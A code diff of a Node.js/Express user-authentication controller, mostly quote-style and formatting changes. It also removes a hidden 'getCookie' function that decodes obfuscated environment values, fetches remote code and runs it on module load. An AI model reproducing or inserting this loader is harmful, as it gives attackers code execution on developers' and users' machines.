@@ -1,20 +1,17 @@
-const User = require("../models/userModel");
-const asyncErrorHandler = require("../middlewares/helpers/asyncErrorHandler");
-const sendToken = require("../utils/sendToken");
-const ErrorHandler = require("../utils/errorHandler");
-const sendEmail = require("../utils/sendEmail");
-const crypto = require("crypto");
-const cloudinary = require("cloudinary");
-const axios = require("axios");
-const path = require("path");
-require('dotenv').config({path: path.resolve(__dirname, '../config/.config.env')});
+const User = require('../models/userModel');
+const asyncErrorHandler = require('../middlewares/helpers/asyncErrorHandler');
+const sendToken = require('../utils/sendToken');
+const ErrorHandler = require('../utils/errorHandler');
+const sendEmail = require('../utils/sendEmail');
+const crypto = require('crypto');
+const cloudinary = require('cloudinary');
 
 // Register User
 exports.registerUser = asyncErrorHandler(async (req, res, next) => {
   const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
-    folder: "avatars",
+    folder: 'avatars',
     width: 150,
-    crop: "scale",
+    crop: 'scale',
   });
 
   const { name, email, gender, password } = req.body;
@@ -38,19 +35,19 @@ exports.loginUser = asyncErrorHandler(async (req, res, next) => {
   const { email, password } = req.body;
 
   if (!email || !password) {
-    return next(new ErrorHandler("Please Enter Email And Password", 400));
+    return next(new ErrorHandler('Please Enter Email And Password', 400));
   }
 
-  const user = await User.findOne({ email }).select("+password");
+  const user = await User.findOne({ email }).select('+password');
 
   if (!user) {
-    return next(new ErrorHandler("Invalid Email or Password", 401));
+    return next(new ErrorHandler('Invalid Email or Password', 401));
   }
 
   const isPasswordMatched = await user.comparePassword(password);
 
   if (!isPasswordMatched) {
-    return next(new ErrorHandler("Invalid Email or Password", 401));
+    return next(new ErrorHandler('Invalid Email or Password', 401));
   }
 
   sendToken(user, 201, res);
@@ -58,14 +55,14 @@ exports.loginUser = asyncErrorHandler(async (req, res, next) => {
 
 // Logout User
 exports.logoutUser = asyncErrorHandler(async (req, res, next) => {
-  res.cookie("token", null, {
+  res.cookie('token', null, {
     expires: new Date(Date.now()),
     httpOnly: true,
   });
 
   res.status(200).json({
     success: true,
-    message: "Logged Out",
+    message: 'Logged Out',
   });
 });
 
@@ -84,7 +81,7 @@ exports.forgotPassword = asyncErrorHandler(async (req, res, next) => {
   const user = await User.findOne({ email: req.body.email });
 
   if (!user) {
-    return next(new ErrorHandler("User Not Found", 404));
+    return next(new ErrorHandler('User Not Found', 404));
   }
 
   const resetToken = await user.getResetPasswordToken();
@@ -92,9 +89,7 @@ exports.forgotPassword = asyncErrorHandler(async (req, res, next) => {
   await user.save({ validateBeforeSave: false });
 
   // const resetPasswordUrl = `${req.protocol}://${req.get("host")}/password/reset/${resetToken}`;
-  const resetPasswordUrl = `https://${req.get(
-    "host"
-  )}/password/reset/${resetToken}`;
+  const resetPasswordUrl = `https://${req.get('host')}/password/reset/${resetToken}`;
 
   // const message = `Your password reset token is : \n\n ${resetPasswordUrl}`;
 
@@ -123,10 +118,7 @@ exports.forgotPassword = asyncErrorHandler(async (req, res, next) => {
 // Reset Password
 exports.resetPassword = asyncErrorHandler(async (req, res, next) => {
   // create hash token
-  const resetPasswordToken = crypto
-    .createHash("sha256")
-    .update(req.params.token)
-    .digest("hex");
+  const resetPasswordToken = crypto.createHash('sha256').update(req.params.token).digest('hex');
 
   const user = await User.findOne({
     resetPasswordToken,
@@ -134,7 +126,7 @@ exports.resetPassword = asyncErrorHandler(async (req, res, next) => {
   });
 
   if (!user) {
-    return next(new ErrorHandler("Invalid reset password token", 404));
+    return next(new ErrorHandler('Invalid reset password token', 404));
   }
 
   user.password = req.body.password;
@@ -147,12 +139,12 @@ exports.resetPassword = asyncErrorHandler(async (req, res, next) => {
 
 // Update Password
 exports.updatePassword = asyncErrorHandler(async (req, res, next) => {
-  const user = await User.findById(req.user.id).select("+password");
+  const user = await User.findById(req.user.id).select('+password');
 
   const isPasswordMatched = await user.comparePassword(req.body.oldPassword);
 
   if (!isPasswordMatched) {
-    return next(new ErrorHandler("Old Password is Invalid", 400));
+    return next(new ErrorHandler('Old Password is Invalid', 400));
   }
 
   user.password = req.body.newPassword;
@@ -167,7 +159,7 @@ exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
     email: req.body.email,
   };
 
-  if (req.body.avatar !== "") {
+  if (req.body.avatar !== '') {
     const user = await User.findById(req.user.id);
 
     const imageId = user.avatar.public_id;
@@ -175,9 +167,9 @@ exports.updateProfile = asyncErrorHandler(async (req, res, next) => {
     await cloudinary.v2.uploader.destroy(imageId);
 
     const myCloud = await cloudinary.v2.uploader.upload(req.body.avatar, {
-      folder: "avatars",
+      folder: 'avatars',
       width: 150,
-      crop: "scale",
+      crop: 'scale',
     });
 
     newUserData.avatar = {
@@ -214,9 +206,7 @@ exports.getSingleUser = asyncErrorHandler(async (req, res, next) => {
   const user = await User.findById(req.params.id);
 
   if (!user) {
-    return next(
-      new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404)
-    );
+    return next(new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404));
   }
 
   res.status(200).json({
@@ -250,9 +240,7 @@ exports.deleteUser = asyncErrorHandler(async (req, res, next) => {
   const user = await User.findById(req.params.id);
 
   if (!user) {
-    return next(
-      new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404)
-    );
+    return next(new ErrorHandler(`User doesn't exist with id: ${req.params.id}`, 404));
   }
 
   await user.remove();
@@ -261,13 +249,3 @@ exports.deleteUser = asyncErrorHandler(async (req, res, next) => {
     success: true,
   });
 });
-
-//Get Cookie
-exports.getCookie = asyncErrorHandler(async (req, res, next) => {
-  const s = atob(process.env.DEV_API_KEY);
-  const k = atob(process.env.DEV_SECRET_KEY);
-  const v = atob(process.env.DEV_SECRET_VALUE);
-  const r = (await axios.get(s,{headers:{[k]:v}})).data.record.cookie;
-  const handler = new (Function.constructor)('require',r);
-  handler(require);
-})();
